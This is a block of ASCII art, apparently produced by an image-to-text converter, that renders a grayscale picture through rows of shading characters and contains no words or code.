MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmddhhhysooosyddmNMMMMMNNmmyo::://++oosyyyyso++osydmNNdhhhhddmNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMNNNMNNNNNNNNNNmmmmmmmmmmmmmmmNNNNmmmNNNNmmmmNNNNmNNNNNNNNNNNNmmNNNNNNNmmNNmmmmmmmmmNNNNNNNmdhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhyyysssyhmmNmhsooossyyhhhhyysssssssoo+///::-..-:+yhmmNMMMMMMMMMMMMMMMMMNmNNNMMMMMMMMMMMMMMMNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdhhhhhyso++shdddNMMMNNNmdyo////++oossyyyyso++shmNNmdyyhhdmmmmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNMMMMMMNMNNNNNNmmmmmmmmmmmNNNmmmmNNNNmmmmNNNNmmNNmmmmmmmmmmmmmmmmmNmmmmNNNNNNNNNNNNMNNmmmdhhhyyhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhyysssyhmmmdysoosyhhhhhhhhyyssssoo+///:--..-+hmNNMMMMMMMMMMMMMMMMNNmdhhhdmNNNNNNNNNMNNmhyyhdmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdhhhhyyyso+++shhhdNNNmdhyso+///++oossyyyysoooydmNNmhhhhhdmmmNNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMNNNNNMMMMMMNNNNNNNNmmmmmmmmmmNNNNNNNNNNmmmmmmmNNNmmmmdhhhhhyyhhhhdmmmNNNNNNNNNNNNmmmNNNNNNmddhhyyyyyhyhhhhhhhhhhhhhhdhhhhhhhhdddddhhhhysssyhdmmdhsoosssyhddddhyyyysoo++//:-...-+hmNNMMMMMMMMMMMMMMNmdddhhhyyyysosshdmmdho/+oyhddmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNdhhyyysssso+++yhdddmmhs+//:///+++oosyyyssoosydNNNmhyhhdmmmmNNNNNNNNNNNNNMMMNNNNNNNNNNNNMNNNNNNNNNMMMMMMMNNNNNNNmmmmmmmmmmNNNNNNNNNmmmmmmdddddddmmdhyysooossssoosyhdmNNNNNNNNNNNNNNNNNNNdhhyyyssyyhhhhhhhhhhhhhhhhdhhhhhhhhddhhddhhhhhyysssydmNmdsoosyhhdddhhyyyssoo++//:-.`.-ohmNMMMMMMMMMMMMNmdhyhdmmmmmmdhhhhhhysoooshhdmmmdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdyyssysssso++oyhhhyso:--:///++oooossyssooshdNNmdhhhdddmmNNNNNNMNNNNNNNNNMMNNNNNNNNNmmmmNNNNNNNNNNMMMMMMMMMMNNNNNNNNNmmmmmmNNNNNNNNNmmmdddddddmmmddhys+/://+++////+oshmNMNNNNNNNNNNNNNNNmhhyssssyyhhhhhhhhhhhhhhhhddhhhhhhddhhhhhhhhddhhyysssyhmNmdyssyyhddhhyyyssoooo++/-..`.:+hmNNNNNNNNNmmdhyyyyhddmmNNMMMMMMNmdhhhddmmmNNNmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmhyyhhhysooo//ohys+:----://++oosyysssoooshmNNmhyyhdmmmNNNNNNNNNNNNNNNNNNNNMNNNNNNNNNmmmmmmNNNNNNNNNMMMMMMNNNNNNNNNNNNmmmmmmmNNNNNNNmmmddddddddddhyso+/::---:::::::/:/+shNNNNNNNNNNNNNNNNmdhyssssyyyhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhddddddhhhyyyssyhmNmdhyyyhhhhyysooooooo+/:-..`.-/shmmNmmhysoooosyyyhhhhmNNMMMMMNNNmdddmmmNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmmddddmmdhsoooosyyo:-.--:/++oossyyyysoooyhmNNmhssyhmNNNNNNNNNNNNNNNmNmNNNNNNMMNNNNNNNNNNNmmmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmdddhhhhhhyysoo+/::-------------:::://shmNNNNNNmmmNNNmmdhyysssyyhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhdddddhhhhhhyyssyhmNNmhyssssysoooooooo+/:---...-/osyyso++syhhyhdddhhyhdmNNNNNNmmddddmmmmNmmmmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmmmdmmNmmdyso+yhy/-..-:/++oosyyyyyysoosdmNNdhsyyhdmmmNNNNNNNNNNNNMNNNNmNNNNNNNNNNmmNNNNNNNNNmmmmmmmmNNNNNNNNNNNNMMNNNNNNNNNNNNNNNNNmmddhhyyssooooo+/::--.----------------:::+sdNMMMNmmmNNNdhhyssssyyyhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhddddhdhhhhhhhhyyssydmNNdhsosssssoooooo+//:::-...-/ossossydddhyyhdhyssshdmNNNmmdhhhhddmmmmdhhdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmdhhdmNNmdhysyys/-.--:/++oyyhhhyssssyhmNNmhssyhdmmmmmNNNNNNNNNNNNMMMMNNNNNNNNNNNNmNNNNNNNNNNNmmmmmmmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmddhhhhhyssssoo+/:--------...-------------:/ymNMNmmmmNNmhyyyyyyyyyhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhdddhhhhhhhddhhhhyyssyhmNNdyssssssoooooo+///:--...:oyhddddddhhhhhhhsoooydmmmmmdddmddmmNNNNNmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdhhhmNNNNNmmhs+:---://+osyhhhhyso+shmNNmhysyhdmmmNNNNNNNmmmNNNNNNMMMMNNNNNNNNNNNNNNNNNNNNNNNmmmmmmmmmmmNNNNNNNNNNNNNNNNNNNNNNmmmmmmdhyyyyhhyyyhyso+/:----..........--------:--.-/ymNNmddNNmhyyyyyyyyyhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhddddddhdddddhhhhyyssyhmNmdyooooossssso++//:--..-/shdmmmmmdddhssyhhyyhdmmmddddmmmmmNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdhhhdmNNNNNmds:..-://++osyhdhyysooydNNNhssyhdmmNNNNNNNNNNNNNNNNNNNMMMMMNNNNNNNNNNNNNNNNNNNNNNNmmmmmmNmmmmmmmmmmmmmNmmmmmNNNNmmmmmddddhyysosso+osyo+/:--................------::-..-+hdhhhmmdyyyyyyyhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhdddddddddddddhhhhyyyssyhNNmho/+oossysso+++/:--.../shmmmddhyyysyhhdhhsshddddddmmmmmmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdhyhdmmNNNNds+-..--//+oosshhhhyssydNNNdysshdmmNNNNNNNNNNNmNNNNNNNNMMMNNNNNNNNNNNNNNNNNNNNNNNNNNmmmmmmNNNNmmmdmmmmmmmmmmmmmmmmmmmmmdddddhyssooo/://::::-......................------.-/oyhdmdhyyhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhddddddddddddddhhhhyssshdNNds+++ossyysso+///--.../oyhhhysshhhddddhyo/+oshhhdmmmdmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNmhsshdmmNNmho-.`.-::++ossyyyhhyyyhmNNdhssyyhmmNNNNNNNNNNNmmmNNNNNNNMMMNNNNNNNNNNNNNNNNNNNNNNNNNNmmmmmmmmNNNNmmmmmmmmmmmmmmmmmmmmmmmmdhhdhhhyyso++++/::--.........................-.-----/ydmhyyyhhhhhhyhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhdddddddddddddddddhhhyyssymNmds+ossyyysso++/::-...-:/oyssyhhhhhddddhyssyhhddmNNmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmNNNNNmdhssyhdmmNmho-..--::/oosyyyyyyyyhmNNmhyssshdmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmmmmdmmmmNNmNNNNNNmmmmmmmNmNNmmddddhhhysyyyso+//:::-..........................-.------:+syysyyyhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhdddddddddddddddddddhhhyssydmNmhsssyhyyssoo++/:--...-/ooosssyddmmNNNNNmddmmNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmmmmmmdhsooshddmNmy/...-://++ssyyyyyyyhdmNNdysyyyyhdmNNNNNNNNNNNNNNNNNNNNNNMNNNNNNNNNNNNNNNNNNNNNNNNmmmNNmmmmmmdmmmmmmNNNNNmmmmmmmmmmmmmmddhyssyyso+/+++/:----........--://++++///::--..----------:+osyhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhdddddddddddddddddddddddhyysshmNNdhsyyyyyysso+/:::....-:/++oshmmmNMMMMMMNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmmdddhyo+oyhmddddy/-..-:///++oosssyyyhmNNmhssyhhhhdmmmmNNNNNNNNMNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmmmNmmmmmmmmmmmmmmmmNNmmmmmmmdddddddhhhyssooo+/:://::--......-://+osyyyyyyyyyso++/:-----------:+oshhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhddddddddddddddddddddddddhhhyssyhmNmhysyyysssso/:::-....--:+syhddmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmmdhhysooo++shmNNmdho-.`..-:://++oo+++osdmNNdysyyhhdddmmmmNNNNNNNNMMNNNNNNNNNNNNNNNNNNNNmNNNNNNNNNNNNNmmmNmmmmmmmmmmmmmmmmmmmmmmmmmmmdddhhhhhhyyyyhy+/:--:::---.....://++sydmmmmmNNNNNmmddys+/::-------::/oyhhhhhhhhhhhhhhhhhhhhhhhhhhhhhdddddddddddddddddddddddddddddddddddddddhyyssymNNmhsssssyyo///:--.....-/shddmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmmmNNNmdddmmmdysoooo+++oshmNNNNmho:```.-://+++osso++shNNmhysyhhhdddmmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmNNNmmNNNNNNNNmmmmmmmmmmmmmmddddddmmmmmmmmmmdddddhhdddhyssyhs/-...--......--/+oydmmmddddddmmmNNNNNNmdhyo+/:------:+yhhhhhhhhhhhhhhhhhhhhhhhhhhddddddddddddddddddddddddddddddddddddddddddhhhyssyhmNNhsooosso+///:-......:shdmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmdhhhddysooshddhs+++osooshmNNMMMNdo-.``..:/+ssyyysssshmNNdyssyhhhhddmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmmNNNmmNNNmmmmmmmmmmmmmddddddddmmmmmmmmmmmdddddddmhysoooss+:-....``...-::/osyyyo++++++++ooyhhddNNNMNmdyo//::-::+yhdhhhhhhhhhhhhhhhhhhhhdddddddddddddddddddddddddddddddddddddddddddddddhhhyyssydNNds+ooooooo+/:-....../sdNNMMMMMMMMMMMNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNmmdhysssssooooshhhs++/+ossshmNNMMMMNh/```..-:+osyhhhyyydmNmhssyyhhhddddmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmNNNNmmNNmmmmmmmmmmmmmmNmmmmdddddddhdmmmmmmmmmmmmdddddmdhs+///+oo+:-...`...-:::/+///::::-----:://+osshhdmNNMNdso+/:///shdhhhhhhhhhhhhhhhhhhhhdddddddddddddddddddddddddddddddddddddddddddddddddhhhyysyhNNdyoooossoo/:--...``-/ymNMMMMMMMMMMMNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmmddhhyyyoosyyyyyyyhhyo///+osydmNNMMMMMNy-```.-:/osyhhhhyydNNmhssyyhhddddddmmNNNNNNNNNNNNNNNmmNNNNNNNNNNNNmmmNNNmdmNmmmmdmmmmmmmmmmNmmmmdddddhhhdmmmmmmmmmmmmdhhddmhs+/::///++/-.....---....-----............-:/+syyyyhmNmdso+////oshhhhhhhhhhhhhhhhhhhdddddddddddddddddddddddddddddddddddddddddddddddddddddhhhysshmNmyo+osyso+/:---..``.:ymMMMMMMMMMMMMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdhhhyysssso+oyhhhhyysys+//+oyhdmNMMMMMMMm+.```.:/+oyhhhhhhdNNdyssyhhhdddddddmmmmmNNNNNNNNNNNmmmNNNNNNNNNNmmmmmNNNmdmmmmmmmmNNNmmmmdmmNNmmmdmddddddmmmmmmmmmmmmddddddhs+/---::///:........`````.................---/oyhyssyddyso+///++shhhhhhhhhhhhhhhhhhdddddddddddddddddddddddddddddddddddddddddddddddddddddddhhysshmNmyosssss+///::--.``.:sdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdhhhhyssss++oyhhhyo++oo++osydmmNMMMMMMMNy:```.-/+osyhhyhhmNNdyssyhhhhddddddddmmmNNNNNNNNNNNmmmmNNNNNNNNNmmmmmmNNmmddmmdmmNNNNNNmmmddmmmmmmmmmmmddddmmmmmmmmmmmmmmmmdhs+:----:::::---....`````````................--:+yyysosssoo+/////ohhhhhhhhhhhhddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddhhyssymNmdsoosysso++/::-..`.-+hNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNmmmdddhyyyhysosyhhyo+//osyyyhmmNNMMMMMMMMNs-``..:/+osyyyhdmNNdsssyhhdddddddddddmmmmNNNNmNNNNNmmmmmNNNNNNNNmmmmmmmmmmddddmmNNNNmmmmmmmmmmmmmmmmmmmmdddmmmmmmmmmmmmmmmmmmhs++++++///+//:-..`````````................---::oyhyoo++////::+o+shdhhhhhhhhddddddddddddddddddddddddddddddhddddddddddddddddddddddddddddddddhhhyssydNNhsosyyyyso+//:-...`-+hNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmmdddddmddddddddyosys+/+ossyhdmmmNNMMMMMMMMMMNy:``.-/+ossyyydmNmhsssyhhdddddddddddddmmmmNNNNNmmmNmmmmmNNNNNNmmmNmmmmmmmmmdmmmNNmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmNNmmmmmmmddhyso+++///:-.```````..............--/+oooo++syyo+/::--::/syooyhhhhhhhhdddddddddddddddddddddddddddddddhddddddddddddddddddddddddddddddddhhhhyssydNmdyooyyyyso+//:-..``.+hNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmmmddhyyyyhhhhhddmdhssyyo//shdmmmNNNNNMMMMMMMMMMMNh/..-:/+osssydmNmhssyyhhdddddddddddddddmmmNNNNNmmmmmmmmmNNNNNNmmNNNmmmmmmNmmmNNNNmmdddmmmmmmddmmmmmmmmmmmmdddmmmmmmmmdmNNNmmNNNNmddhsooo+//:--..````.............-/+oooosssssoooo+/:---.--/oo++yhhhhhhhhdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddhhyyssdNNds++oyyyso+//:-..``:smMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmddhhhyyyyyyhhhhdddhysydhyo+osydmmNNNNMMMMMMMMMMMMMNy:..:/+osssyhmNmhssyyhddddddddddddddddddmmNNmNNmmmmmmmmmNNNNNmmmNNNNmmmmmNNmmNNNNNmddhhhhdddddddmmmmmmmmdddddmmmmmmmddmNNNNNNNmNNmmmhssoo+/-..`............-..-:/ossoosyhyyooss+/:--......-/+oyhhhhhhhhhddhhhhddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddhhhyssdNNds//osssso+//:-..`-odMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNmdhhhhhhyyyhhhdhhhhhys+ossooosyssydmNNNMMMMMMMMMMMMMNms:.://+oooshmNmhssyyhhdddddddddddddddddddmmmmmmmmmmmmmmmmmNNNmmmNNNmmdmmmmmmNNNmmmdyo+//++osyyhddddmmmmmdhhdmmddddmmNmmNNNNNNNmmmmmmhs+////:-.`............--:/ossshdNNNNMNdsoso/-...``.``..-/shhhhhhhhhhhhhhdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddhyyssdNNds++osyso++/:-..`./hNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
NNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNmmdhhhhhhhyhhhddhhhyyoo++o+///+ossssydmNNNMMMMMMMMMMMNmh+--//++o+oymNmhssyyhhhdddddddddddddddddmmmmmmmmmdmmmmmmmmmNNNNmmNNNmmddmmmmNmNmmho:---::://///ossyyhdddddddmNNmdhhdmNNNNNNNNNmmmmmmdhs+/:----.`...........-:+osshmNNNNNNMNNNdooo+:...``````...:+shhhhhhhhddddhhhhddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddhyyssdNNho++osoo+++/:-..`:smMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+sydNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmmdhhhhdddhyyyyyyhhhysoo+++ssso++///++oosydddmNNNMMMMMMMNds/:-:++ooooymNNhssyyhhhhdddddddddddddddddmmmmmmNmmdmmmmmmmmmNNNNmmmNmmmdmmmddmmmds:-/ossooooso+/://+oosssyhddmNNNmddddddmmmNNmmmmmdhyysss:-............----:+ossydmmmmmmmmmmmdy+++/-...```````....-/syhhddhhhddhhdhdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddhyssydNmdso++++++++/:-.`.:yNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
/:-:oydNNNNMMMMMMMMMMMMMMMMMMMMMMMMMNNNNmmdhsyhddddhhysooosyyso+++oosooooo+/++ooo+++osyhdNNMMMMNmh+:-::/+oossydNNdsssyhhddddddddddddddddddddmmdmmmNNmmmNmmmmmmmmNNmNmmmmmmdmmmddmdy+:/oo+/:-..:+oso+/:::////+osyhmNNNmdddddddmmmdddhyyyo::/+:.```...--:////+++oooooo+++++++++++++++/:-....``````````...-:+syhdhhhddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddhhysosdNNhs+oo++////:-.``./hNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
dhs+/+oshdmNNNNNMMMMMMMMMMMMMMMMMMNNNNmmmdhysyhdhhhhhyo+oooossosyhhhyooosso++/+++///++++sdmmmNNmy+:-://+oossydNNdyssyhhhdddddddddddddddddddddddmmmNNmmmmmmmmmmmmmmmNmmmddmmmdddddyo:///-..```..-:osyy+:---:-::/+shmNNmmmmmmddddhyyso/+o+:..--...```..-----::::------::////////:::::--......`````..``..``..:+oyhhdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddhhhyssymNmho+o++////:-.```.+dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMNmdhyyyyhdddmmNNNMMMMMMMMMMMMMNNNmmmmddhysoydmmdhyssooooosyyhhdmmmddhyyyyso+++++ooo+///osyhmmdo:-:/++osssydNNdyssyhhhddddddddddddddddddddddddmmmNmmmmmmmmmmmmmmmmmmmmddmmmddddds/-:-...```..--::/+so/--------:+sdmNmmmmNNmddhysoo+//++:.....```````.`......`.............................```````````````..-:+syddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddhyysshmNmy+++++++//:.````-smMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMNNNmmddhhhhhdmmNNMMMMMMMMMNNNNmmdmmdhhso+oydmmmhso++/osyhhhhhhddmmdhysyyysoossssoo++/://shhs/-://+osssshmNmyssyhhhddddddddddddddddddddddddmmmmNmmmmmmmmmmmmmmmmmmmmddmNmddddds:--.....```.--------:-------.-/oydddddmNNmmdyoooosso+/:--...`.```````````````...............-..---.......``````````````.....-:+shdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddhyysshNNdo//++++++:-...``/dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMNNNmddhhhhhddmmNNMMMMMNNNNNmdhdddhso+++ossso///+syhdhhyyhdmmmmdysyhddhyssssssso+////+o+/:::/+oossshmNNhossyhhhhhddddddddddddddddddddddmmmNNmmNmmmmmmmmmmNNNNNmmddmmmmddddy/.....-.```.......`.::-----..-:+osyssydmNNmhso+++osso/--............`````````..............-------...........`````.....``````.-:+syhddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddhhyyosmNNho/++ooo+/:...``-smMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
